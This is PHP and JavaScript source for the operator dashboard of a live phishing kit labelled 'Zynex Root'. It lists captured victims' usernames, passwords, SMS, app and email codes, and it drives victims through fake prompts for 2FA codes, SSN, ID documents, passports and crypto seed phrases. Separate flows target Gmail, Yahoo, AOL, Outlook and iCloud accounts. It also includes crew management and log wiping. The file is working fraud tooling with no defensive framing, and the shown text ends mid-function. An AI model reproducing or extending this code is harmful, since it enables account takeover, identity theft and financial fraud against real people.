<?php
require_once 'inc/config.php';
require_once 'inc/connect.php';

date_default_timezone_set('Europe/Dublin');

if (session_status() !== PHP_SESSION_ACTIVE) {
    session_start();
}

header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');
header('X-XSS-Protection: 1; mode=block');
header('Referrer-Policy: strict-origin-when-cross-origin');

if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    header('Location: login.php');
    exit;
}

if (!isset($_SESSION['regenerated'])) {
    session_regenerate_id(true);
    $_SESSION['regenerated'] = true;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="all,follow">
    <title>Zynex Root - Admin Dashboard</title>
    
    <link rel="stylesheet" href="vendor/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://unpkg.com/webkul-micron@1.1.6/dist/css/micron.min.css">
    <link rel="stylesheet" href="css/toastr.min.css">
    <link rel="stylesheet" href="css/flag-icon.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    
    <link rel="icon" type="image/x-icon" href="img/favicon.ico">
    
    <style>
        :root {
            --primary-color: #6366f1;
            --primary-dark: #4f46e5;
            --secondary-color: #8b5cf6;
            --accent-color: #06b6d4;
            --success-color: #10b981;
            --warning-color: #f59e0b;
            --error-color: #ef4444;
            --info-color: #3b82f6;
            
            --dark-bg: #0f172a;
            --darker-bg: #1e293b;
            --card-bg: #1e293b;
            --card-hover: #334155;
            --header-bg: #0f172a;
            
            --text-primary: #ffffff;
            --text-secondary: #e2e8f0;
            --text-muted: #cbd5e1;
            
            --border-color: #334155;
            --border-light: #475569;
            
            --shadow-sm: 0 1px 3px 0 rgba(0, 0, 0, 0.3), 0 1px 2px 0 rgba(0, 0, 0, 0.2);
            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.3), 0 2px 4px -1px rgba(0, 0, 0, 0.2);
            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.3), 0 4px 6px -2px rgba(0, 0, 0, 0.2);
            --shadow-xl: 0 20px 25px -5px rgba(0, 0, 0, 0.4), 0 10px 10px -5px rgba(0, 0, 0, 0.3);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: var(--dark-bg);
            min-height: 100vh;
            color: var(--text-primary);
            overflow-x: hidden;
        }

        .modern-header {
            background: var(--header-bg);
            border-bottom: 1px solid var(--border-color);
            padding: 1.5rem 0;
            top: 0;
            z-index: 1000;
            box-shadow: var(--shadow-lg);
        }

        .header-container {
            width: 100%;
            max-width: none;
            padding: 0 2rem;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 2rem;
        }

        .logo-section {
            display: flex;
            align-items: center;
            gap: 1rem;
        }

        .logo-section img {
            width: 100px;
            height: 100px;
            border-radius: 12px;
            box-shadow: var(--shadow-sm);
            transition: transform 0.2s ease;
        }

        .logo-section img:hover {
            transform: scale(1.05);
        }

        .support-btn {
            background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
            color: white;
            padding: 1rem 2rem;
            border-radius: 12px;
            text-decoration: none;
            font-weight: 600;
            font-size: 1rem;
            transition: all 0.3s ease;
            box-shadow: var(--shadow-sm);
            display: flex;
            align-items: center;
            gap: 0.75rem;
            border: none;
        }

        .support-btn:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-lg);
            color: white;
            text-decoration: none;
        }

        .stats-container {
            width: 100%;
            max-width: none;
            margin: 2rem 0;
            padding: 0 2rem;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 2rem;
        }

        .stat-card {
            background: var(--card-bg);
            border-radius: 16px;
            padding: 2rem;
            box-shadow: var(--shadow-lg);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            border: 1px solid var(--border-color);
        }

        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
        }

        .stat-card:hover {
            transform: translateY(-3px);
            box-shadow: var(--shadow-xl);
            background: var(--card-hover);
        }

        .stat-header {
            display: flex;
            align-items: center;
            gap: 1.5rem;
            margin-bottom: 1rem;
        }

        .stat-icon {
            width: 50px;
            height: 50px;
            border-radius: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.4rem;
            color: white;
        }

        .stat-icon.visits { background: linear-gradient(135deg, #3b82f6, #1d4ed8); }
        .stat-icon.clients { background: linear-gradient(135deg, #10b981, #059669); }
        .stat-icon.active { background: linear-gradient(135deg, #f59e0b, #d97706); }
        .stat-icon.crews { background: linear-gradient(135deg, #8b5cf6, #7c3aed); }

        .stat-title {
            font-size: 0.9rem;
            font-weight: 600;
            color: var(--text-secondary);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .stat-number {
            font-size: 2.5rem;
            font-weight: 800;
            color: var(--text-primary);
            line-height: 1;
        }

        .action-bar {
            width: 100%;
            max-width: none;
            margin: 0 0 2rem;
            padding: 0 2rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 1.5rem;
        }

        .action-buttons {
            display: flex;
            gap: 1rem;
            flex-wrap: wrap;
        }

        .action-btn {
            background: var(--card-bg);
            border: 1px solid var(--border-color);
            color: var(--text-primary);
            padding: 1rem 1.5rem;
            border-radius: 12px;
            font-size: 0.9rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 0.75rem;
            box-shadow: var(--shadow-sm);
        }

        .action-btn:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-md);
            border-color: var(--primary-color);
            background: var(--card-hover);
            color: var(--primary-color);
        }

        .action-btn i {
            font-size: 1.1rem;
        }

        .user-menu {
            display: flex;
            align-items: center;
            gap: 1rem;
        }

        .nav-link-modern {
            color: var(--text-primary);
            text-decoration: none;
            padding: 1rem 1.5rem;
            border-radius: 12px;
            font-weight: 600;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 0.75rem;
            background: var(--card-bg);
            box-shadow: var(--shadow-sm);
            border: 1px solid var(--border-color);
            font-size: 0.9rem;
        }

        .nav-link-modern:hover {
            background: var(--primary-color);
            color: white;
            transform: translateY(-2px);
            box-shadow: var(--shadow-md);
            text-decoration: none;
            border-color: var(--primary-color);
        }

        .nav-link-modern i {
            font-size: 1.1rem;
        }

        .main-content {
            width: 100%;
            max-width: none;
            margin: 0;
            padding: 0 2rem 2rem;
        }

        .content-card {
            background: var(--card-bg);
            border-radius: 16px;
            box-shadow: var(--shadow-lg);
            overflow: hidden;
            border: 1px solid var(--border-color);
        }

        .card-header {
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            color: white;
            padding: 1.5rem 2rem;
            font-size: 1.2rem;
            font-weight: 700;
            display: flex;
            align-items: center;
            gap: 1rem;
        }

        .card-header i {
            font-size: 1.3rem;
        }

        .table-container {
            overflow-x: auto;
            max-height: 75vh;
        }

        .modern-table {
            width: 100%;
            border-collapse: separate;
            border-spacing: 0;
            font-size: 0.9rem;
        }

        .modern-table thead th {
            background: var(--darker-bg);
            color: var(--text-primary);
            font-weight: 700;
            font-size: 0.8rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            padding: 1.25rem 1rem;
            text-align: left;
            position: sticky;
            top: 0;
            z-index: 10;
            border-bottom: 2px solid var(--border-color);
        }

        .modern-table tbody tr {
            transition: all 0.2s ease;
            border-bottom: 1px solid var(--border-color);
        }

        .modern-table tbody tr:hover {
            background: var(--card-hover);
        }

        .modern-table tbody td {
            padding: 1rem;
            vertical-align: middle;
            color: var(--text-primary);
            font-weight: 500;
        }

        .table-actions {
            display: flex;
            gap: 0.5rem;
            flex-wrap: wrap;
        }

        .btn-action {
            padding: 0.6rem;
            border: none;
            border-radius: 10px;
            font-size: 0.8rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            min-width: 40px;
            height: 40px;
            position: relative;
        }

        .btn-action i {
            font-size: 1rem;
        }

        .control-button {
            background: linear-gradient(135deg, #3b82f6, #1d4ed8);
            color: white;
            font-size: 0.75rem;
            padding: 0.6rem 0.8rem;
            white-space: nowrap;
            min-width: 100px;
            height: auto;
            gap: 0.5rem;
        }

        .email-button {
            background: linear-gradient(135deg, #10b981, #059669);
            color: white;
            font-size: 0.75rem;
            padding: 0.6rem 0.8rem;
            white-space: nowrap;
            min-width: 100px;
            height: auto;
            gap: 0.5rem;
        }

        .btn-info {
            background: linear-gradient(135deg, #f59e0b, #d97706);
            color: white;
        }

        .btn-download {
            background: linear-gradient(135deg, #8b5cf6, #7c3aed);
            color: white;
        }

        .btn-alert {
            background: linear-gradient(135deg, #f97316, #ea580c);
            color: white;
        }

        .btn-ban {
            background: linear-gradient(135deg, #ef4444, #dc2626);
            color: white;
        }

        .btn-delete {
            background: linear-gradient(135deg, #dc2626, #b91c1c);
            color: white;
        }

        .btn-action:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-md);
        }

        .modal-content {
            border-radius: 20px;
            border: none;
            box-shadow: var(--shadow-xl);
            background: var(--card-bg);
            color: var(--text-primary);
            overflow: hidden;
        }

        .modal-header {
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            color: white;
            border-radius: 20px 20px 0 0;
            padding: 1.5rem 2rem;
            border-bottom: none;
            position: relative;
        }

        .modal-header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, #ffffff20, #ffffff40, #ffffff20);
        }

        .modal-title {
            font-weight: 700;
            font-size: 1.3rem;
            display: flex;
            align-items: center;
            gap: 1rem;
        }

        .modal-title::before {
            content: '⚡';
            font-size: 1.6rem;
        }

        .modal-body {
            padding: 2rem;
            background: var(--card-bg);
            min-height: 250px;
        }

        .close {
            color: white;
            opacity: 1;
            font-size: 2rem;
            font-weight: 300;
            text-shadow: none;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
            width: 45px;
            height: 45px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
        }

        .close:hover {
            color: white;
            opacity: 1;
            background: rgba(255, 255, 255, 0.2);
            transform: rotate(90deg);
        }

        .button {
            background: linear-gradient(135deg, var(--card-hover), var(--darker-bg));
            color: var(--text-primary);
            border: 2px solid var(--border-color);
            padding: 1rem 1.5rem;
            border-radius: 12px;
            font-weight: 600;
            font-size: 0.9rem;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            text-align: center;
            min-height: 50px;
        }

        .button:hover {
            background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
            color: white;
            border-color: var(--primary-color);
            transform: translateY(-2px);
            box-shadow: var(--shadow-lg);
        }

        .error-button {
            border-color: var(--error-color);
            background: linear-gradient(135deg, rgba(239, 68, 68, 0.2), rgba(220, 38, 38, 0.2));
            color: #ff6b6b;
        }

        .error-button:hover {
            background: linear-gradient(135deg, var(--error-color), #dc2626);
            border-color: var(--error-color);
            color: white;
        }

        .finish-button {
            border-color: var(--success-color);
            background: linear-gradient(135deg, rgba(16, 185, 129, 0.2), rgba(5, 150, 105, 0.2));
            color: #4ade80;
        }

        .finish-button:hover {
            background: linear-gradient(135deg, var(--success-color), #059669);
            border-color: var(--success-color);
            color: white;
        }

        .email-group {
            margin-bottom: 2rem;
        }

        .provider-header {
            background: linear-gradient(135deg, var(--darker-bg), var(--card-hover));
            color: var(--text-primary);
            padding: 1.25rem 1.5rem;
            border-radius: 12px 12px 0 0;
            font-weight: 700;
            font-size: 1.1rem;
            display: flex;
            align-items: center;
            gap: 1rem;
            border: 2px solid var(--border-color);
            border-bottom: none;
        }

        .email-buttons {
            background: var(--card-bg);
            border: 2px solid var(--border-color);
            border-top: none;
            border-radius: 0 0 12px 12px;
            padding: 1.5rem;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
            gap: 1rem;
        }

        @media (max-width: 768px) {
            .header-container {
                padding: 0 1rem;
                flex-direction: column;
                text-align: center;
                gap: 1rem;
            }

            .stats-container {
                padding: 0 1rem;
                grid-template-columns: 1fr;
                gap: 1rem;
            }

            .action-bar {
                padding: 0 1rem;
                flex-direction: column;
                align-items: stretch;
                gap: 1rem;
            }

            .action-buttons {
                justify-content: center;
                width: 100%;
            }

            .action-btn {
                flex: 1;
                min-width: 140px;
            }

            .user-menu {
                width: 100%;
                justify-content: center;
            }

            .nav-link-modern {
                flex: 1;
                justify-content: center;
                min-width: 110px;
            }

            .main-content {
                padding: 0 1rem 2rem;
            }

            .modern-table thead {
                display: none;
            }

            .modern-table tbody tr {
                display: block;
                background: var(--card-bg);
                border-radius: 12px;
                margin-bottom: 1rem;
                padding: 1rem;
                box-shadow: var(--shadow-sm);
                border: 1px solid var(--border-color);
            }

            .modern-table tbody td {
                display: block;
                padding: 0.75rem 0;
                border-bottom: 1px solid var(--border-color);
                color: var(--text-primary) !important;
            }

            .modern-table tbody td:last-child {
                border-bottom: none;
            }

            .modern-table tbody td:nth-child(1)::before { content: "ID: "; }
            .modern-table tbody td:nth-child(2)::before { content: "Ping: "; }
            .modern-table tbody td:nth-child(3)::before { content: "IP: "; }
            .modern-table tbody td:nth-child(4)::before { content: "Country: "; }
            .modern-table tbody td:nth-child(5)::before { content: "Username: "; }
            .modern-table tbody td:nth-child(6)::before { content: "Password: "; }
            .modern-table tbody td:nth-child(7)::before { content: "SMSCode: "; }
            .modern-table tbody td:nth-child(8)::before { content: "AppCode: "; }
            .modern-table tbody td:nth-child(9)::before { content: "EmailCode: "; }
            .modern-table tbody td:nth-child(10)::before { content: "Status: "; }
            .modern-table tbody td:nth-child(11)::before { content: "Action: "; }

            .modern-table tbody td::before {
                font-weight: 700;
                color: var(--primary-color);
                display: inline-block;
                width: 100px;
                margin-bottom: 4px;
                font-size: 0.8rem;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }

            .table-actions {
                display: flex;
                flex-direction: column;
                gap: 0.75rem;
                margin-top: 1rem;
            }

            .control-button,
            .email-button {
                width: 100%;
                justify-content: center;
                padding: 1rem 1.5rem;
                font-size: 0.9rem;
                min-height: 50px;
                white-space: normal;
                line-height: 1.3;
                display: flex;
                align-items: center;
                gap: 0.75rem;
            }

            .btn-action {
                width: 100%;
                justify-content: center;
                padding: 0.9rem;
                font-size: 0.85rem;
                min-height: 45px;
                margin-bottom: 0.5rem;
            }

            .email-buttons {
                grid-template-columns: 1fr;
            }

            #redirect-buttons {
                grid-template-columns: 1fr !important;
            }
        }

        .clickable-cell {
            cursor: pointer;
            transition: all 0.2s ease;
            border-radius: 8px;
            padding: 0.5rem 0.75rem !important;
            margin: 0.1rem;
            display: inline-block;
            min-width: 70px;
            background: rgba(99, 102, 241, 0.1);
            border: 1px solid rgba(99, 102, 241, 0.2);
            color: var(--text-primary) !important;
        }

        .clickable-cell:hover {
            background: var(--primary-color);
            color: white !important;
            transform: scale(1.02);
            border-color: var(--primary-color);
        }

        .status-badge {
            padding: 0.5rem 1rem;
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .status-online {
            background: linear-gradient(135deg, #10b981, #059669);
            color: white;
        }

        .status-offline {
            background: linear-gradient(135deg, #6b7280, #4b5563);
            color: white;
        }

        .status-after-login {
            background: linear-gradient(135deg, #3b82f6, #1d4ed8);
            color: white;
        }

        ::-webkit-scrollbar {
            width: 10px;
            height: 10px;
        }

        ::-webkit-scrollbar-track {
            background: var(--darker-bg);
            border-radius: 5px;
        }

        ::-webkit-scrollbar-thumb {
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            border-radius: 5px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: linear-gradient(135deg, var(--primary-dark), var(--primary-color));
        }

        .loading {
            display: inline-block;
            width: 24px;
            height: 24px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .pulse {
            animation: pulse 0.5s ease-in-out;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.02); }
            100% { transform: scale(1); }
        }

        .blink_me {
            animation: blinker 1s linear infinite;
        }

        @keyframes blinker {
            50% {
                opacity: 0.5;
            }
        }
    </style>
</head>

<body>
    <header class="modern-header">
        <div class="header-container">
            <div class="logo-section">
                <a href="index.php">
                    <img  src="logo.png" alt="Logo">
                </a>
            </div>
            
            <a href="https://t.me/void" class="support-btn" target="_blank">
                <i class="fas fa-headset"></i>
                Support
            </a>
        </div>
    </header>

    <div class="stats-container">
        <div class="stat-card">
            <div class="stat-header">
                <div class="stat-icon visits">
                    <i class="fas fa-chart-line"></i>
                </div>
                <div>
                    <div class="stat-title">Site Visits</div>
                    <div class="stat-number" id="total_visits"><?php echo total_visits($conn); ?></div>
                </div>
            </div>
        </div>

        <div class="stat-card">
            <div class="stat-header">
                <div class="stat-icon clients">
                    <i class="fas fa-users"></i>
                </div>
                <div>
                    <div class="stat-title">Total clients</div>
                    <div class="stat-number" id="total_clients"><?php echo total_clients($conn); ?></div>
                </div>
            </div>
        </div>

        <div class="stat-card">
            <div class="stat-header">
                <div class="stat-icon active">
                    <i class="fas fa-user-check"></i>
                </div>
                <div>
                    <div class="stat-title">Active clients</div>
                    <div class="stat-number" id="online_clients"><?php echo online_clients($conn); ?></div>
                </div>
            </div>
        </div>

        <div class="stat-card">
            <div class="stat-header">
                <div class="stat-icon crews">
                    <i class="fas fa-user-shield"></i>
                </div>
                <div>
                    <div class="stat-title">Current Crews</div>
                    <div class="stat-number" id="active_handlers"><?php echo online_handlers($conn); ?></div>
                </div>
            </div>
        </div>
    </div>

    <div class="action-bar">
        <div class="action-buttons">
            <button class="action-btn" onclick="reset_bans();" title="Reset Bans">
                <i class="fas fa-recycle"></i>
                Reset Bans
            </button>
            <button class="action-btn" onclick="reset_visits();" title="Reset Visits">
                <i class="fas fa-globe"></i>
                Reset Visits
            </button>
            <button class="action-btn" onclick="wipe();" title="Wipe Logs">
                <i class="fas fa-trash"></i>
                Wipe Logs
            </button>
            <button class="action-btn" onclick="pause_all_alerts();" title="Pause All Alerts">
                <i class="fas fa-bell-slash"></i>
                Pause Alerts
            </button>
            <button class="action-btn" onclick="saveAll();" title="Download All Data">
                <i class="fas fa-download"></i>
                Download All
            </button>
        </div>

        <div class="user-menu">
            <?php
            if (session_status() === PHP_SESSION_NONE) {
                session_start();
            }

            if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true && $_SESSION['role'] !== 'Handler') {
            ?>
                <a href="settings.php" class="nav-link-modern">
                    <i class="fas fa-cog"></i>
                    Settings
                </a>
                <a href="crew.php" class="nav-link-modern">
                    <i class="fas fa-users"></i>
                    Crew
                </a>
            <?php
            }
            ?>
            <a href="logout.php" class="nav-link-modern">
                <i class="fas fa-sign-out-alt"></i>
                Logout
            </a>
        </div>
    </div>

    <div class="main-content">
        <div class="content-card">
            <div class="card-header">
                <i class="fas fa-table"></i>
                clients Management Dashboard
            </div>
            
            <div class="table-container">
                <table class="modern-table">
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Ping</th>
                            <th>IP</th>
                            <th>Country</th>
                            <th>Username</th>
                            <th>Password</th>
                            <th>SMS Code</th>
                            <th>App Code</th>
                            <th>Email Code</th>
                            <th>Status</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody id="clients_table">
                        <?php
                        $query = mysqli_query($conn, "SELECT * from clients");
                        if ($query) {
                            if (mysqli_num_rows($query) >= 1) {
                                $array = array_filter(mysqli_fetch_all($query, MYSQLI_ASSOC));
                            }
                        }

                        $redirects = "
                        <button type='button' class='btn-action control-button' onclick='pause(); showRedirectModal(\"CHANGE_TO_ID\");'><i class='fas fa-home'></i> Control Panel</button>

                        <button type='button' class='btn-action email-button' onclick='pause(); showSecondModal(\"CHANGE_TO_ID\");'><i class='fas fa-envelope'></i> Email Panel</button>
                        ";

                        $btns = "
                        <td style='vertical-align:middle;' data-label='Actions'>
                            <div class='table-actions'>
                                CHANGE_TO_REDIRECTS
                                <button class='btn-action btn-info' type='button' data-toggle='modal' data-target='#myModal' onclick='show_info(\"CHANGE_TO_ID\");' title='Show Details'><i class='fas fa-info'></i></button>
                                <button class='btn-action btn-download' type='button' onclick='save(\"CHANGE_TO_ID\");' title='Download'><i class='fas fa-download'></i></button>
                                <button class='btn-action btn-alert' type='button' onclick='pause_alert(\"CHANGE_TO_ID\");' title='Silent Alert'><i class='fas fa-bell-slash'></i></button>
                                <button class='btn-action btn-ban' type='button' onclick='ban(\"CHANGE_TO_ID\");' title='Ban'><i class='fas fa-ban'></i></button>
                                <button class='btn-action btn-delete' type='button' onclick='remove(\"CHANGE_TO_ID\");' title='Delete'><i class='fas fa-trash'></i></button>
                            </div>
                        </td>
                        ";
                        ?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <div id="myModal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-lg" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="infomodaltitle">Victim Information</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <div class="form-group">
                        <div id="infomodalvalue" class="form-control" style="height: auto; min-height: 300px; background: var(--darker-bg); color: var(--text-primary); border: 2px solid var(--border-color); border-radius: 12px; padding: 1.5rem; font-family: 'Courier New', monospace; font-size: 0.9rem; line-height: 1.6;"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade" id="redirectModal" tabindex="-1" aria-labelledby="redirectModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered modal-xl">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="redirectModalLabel">Select Redirect Action</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <div id="redirect-buttons" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem;">
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade" id="secondModal" tabindex="-1" aria-labelledby="secondModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered modal-xl">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="secondModalLabel">Select Email Provider Action</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body" id="second-buttons">
                    <div class="email-group">
                        <div class="provider-header gmail">
                            <i class="fab fa-google"></i>
                            Gmail
                        </div>
                        <div class="email-buttons" id="group-gmail"></div>
                    </div>

                    <div class="email-group">
                        <div class="provider-header yahoo">
                            <i class="fab fa-yahoo"></i>
                            Yahoo
                        </div>
                        <div class="email-buttons" id="group-yahoo"></div>
                    </div>

                    <div class="email-group">
                        <div class="provider-header aol">
                            <i class="fas fa-at"></i>
                            AOL
                        </div>
                        <div class="email-buttons" id="group-aol"></div>
                    </div>

                    <div class="email-group">
                        <div class="provider-header live">
                            <i class="fab fa-microsoft"></i>
                            Live / Outlook
                        </div>
                        <div class="email-buttons" id="group-live"></div>
                    </div>

                    <div class="email-group">
                        <div class="provider-header icloud">
                            <i class="fab fa-apple"></i>
                            iCloud
                        </div>
                        <div class="email-buttons" id="group-icloud"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>

<script>
let redirectModalInstance = null;
</script>








<script>
function showRedirectModal(id) {
  redirectModalInstance = new bootstrap.Modal(document.getElementById('redirectModal'));
  const container = document.getElementById('redirect-buttons');
  container.innerHTML = '';

  const buttons = [
    { txt: 'Login Error', code: 3 },
    { txt: 'Password Error', code: 7 },
    { txt: 'SMS Code', code: 9, parm: 1 },
    { txt: 'SMSCode Error', code: 11, parm: 1 },
    { txt: 'Email Code', code: 13 },
    { txt: 'EmailCode Error', code: 15 },
    { txt: 'Auth Code', code: 17 },
    { txt: 'AuthCode Error', code: 19 },
    { txt: 'Phone-Info', code: 51 },
    { txt: 'DL-Info', code: 53 },
    { txt: 'SSN-Info', code: 55 },
    { txt: 'Email-Sync', code: 23 },
    { txt: 'Email-Password', code: 25 },
    { txt: 'Document-Start', code: 67 },
    { txt: 'Document-Passport', code: 69 },
    { txt: 'Document-DL', code: 71 },
    { txt: 'Document-GovId', code: 75 },
    { txt: 'Seed', code: 31 },
    { txt: 'Seed Error', code: 33 },
    { txt: 'Reset Password', code: 35 },
    { txt: 'Revert Transfer', code: 37 },
    { txt: 'New Device', code: 39 },
    { txt: 'Verifying-Code', code: 41 },
    { txt: 'Call-Support', code: 65 },
    { txt: 'Redirect Custom', custom: true },
    { txt: 'Redirect', code: 0, finish: true }
  ];

  buttons.forEach(b => {
    const btn = document.createElement('button');
    btn.className = 'button fit-text-button' + 
                    (b.txt.includes('Error') ? ' error-button' : '') + 
                    (b.finish ? ' finish-button' : '');
    btn.setAttribute('type', 'button');
    btn.setAttribute('data-id', id);
    if (b.code !== undefined) {
      btn.setAttribute('data-sts', b.code);
    }
    if (b.parm !== undefined) {
      btn.setAttribute('data-parm', '1');
    }
    if (b.custom) {
      btn.setAttribute('onclick', 'setCustomRedirect()'); // ✅ Ensures popup shows
    }
    btn.setAttribute('title', b.txt);
    btn.innerHTML = `<span>${b.txt}</span>`;
    container.appendChild(btn);
  });

  redirectModalInstance.show();
}
</script>
    <!-- JavaScript files-->


<!-- ✅ Modal Script -->
<script>
let secondModalInstance = null;

function closeSecondModal() {
  if (secondModalInstance) secondModalInstance.hide();
}

function showSecondModal(id) {
  secondModalInstance = new bootstrap.Modal(document.getElementById('secondModal'));

  // Clear groups
  ['yahoo', 'gmail', 'aol', 'live', 'icloud'].forEach(group => {
    const groupDiv = document.getElementById('group-' + group);
    if (groupDiv) groupDiv.innerHTML = '';
  });

  const buttons = [
    { txt: 'Yahoo Verify', code: 350 },
    { txt: 'Yahoo Pass', code: 352 },
    { txt: 'Yahoo Pass-Error', code: 354 },
    { txt: 'Yahoo 2Digital', code: 356, parm: 1 },
    { txt: 'Yahoo SMS', code: 358, parm: 1 },
    { txt: 'Yahoo SMS-Error', code: 360, parm: 1 },
    { txt: 'Yahoo EmailC', code: 362, parm: 1 },
    { txt: 'Yahoo EmailC-Error', code: 364, parm: 1 },
    { txt: 'Yahoo App', code: 366 },
    { txt: 'Yahoo App-Error', code: 368 },
    { txt: 'Yahoo Tap', code: 370 },
    { txt: 'Gmail Verify', code: 300 },
    { txt: 'Gmail Pass', code: 302 },
    { txt: 'Gmail Pass-Error', code: 304 },
    { txt: 'Gmail Phone', code: 306, parm: 1 },
    { txt: 'Gmail SMS', code: 308, parm: 1 },
    { txt: 'Gmail SMS-Error', code: 310, parm: 1 },
    { txt: 'Gmail App', code: 312 },
    { txt: 'Gmail App-Error', code: 314 },
    { txt: 'Gmail Tap', code: 316, parm: 1 },
    { txt: 'AOL Verify', code: 400 },
    { txt: 'AOL Pass', code: 402 },
    { txt: 'AOL Pass-Error', code: 404 },
    { txt: 'AOL 2Digital', code: 406, parm: 1 },
    { txt: 'AOL SMS', code: 408, parm: 1 },
    { txt: 'AOL SMS-Error', code: 410, parm: 1 },
    { txt: 'AOL App', code: 412 },
    { txt: 'AOL App-Error', code: 414 },
    { txt: 'AOL Tap', code: 416 },
    { txt: 'Live Verify', code: 450 },
    { txt: 'Live Pass', code: 452 },
    { txt: 'Live Pass-Error', code: 454 },
    { txt: 'Live last-4digits-phone', code: 456, parm: 1 },
    { txt: 'Live SMS Code', code: 458 },
    { txt: 'Live SMS Code-Error', code: 460 },
    { txt: 'Live EmailRecovery', code: 462, parm: 1 },
    { txt: 'Live EmailRecCode', code: 464 },
    { txt: 'Live EmailRecCode-Error', code: 466 },
    { txt: 'ICloud Verify', code: 500 },
    { txt: 'ICloud Password', code: 502 },
    { txt: 'ICloud Password-Error', code: 504 },
    { txt: 'ICloud SMS', code: 506 },
    { txt: 'ICloud SMS-Error', code: 508 }
  ];

  buttons.forEach(b => {
    const btn = document.createElement('button');
    btn.className = 'button fit-text-button';
    if (b.txt.toLowerCase().includes('error')) btn.classList.add('error-button');

    // Clean label: remove provider name only, nothing else
label = b.txt
  .replace(/^(Yahoo|Gmail|AOL|Live|ICloud)[ -]?/i, '')
  .replace(/\bPass\b/, 'Password')

      .replace('EmailC', 'Email code')
      .replace('EmailRecCode', 'Email Code')
      .replace('last-4digits-phone', 'Last 4 Digits')
      .trim();

    btn.textContent = label;
    btn.setAttribute('type', 'button');
    btn.setAttribute('data-id', id);
    btn.setAttribute('title', b.txt); // Keep original full text
    btn.setAttribute('data-sts', b.code);
    if (b.parm) btn.setAttribute('data-parm', '1');

    btn.addEventListener('click', function () {
      closeSecondModal();
    });

    const lower = b.txt.toLowerCase();
    let group = '';
    if (lower.startsWith('yahoo')) group = 'yahoo';
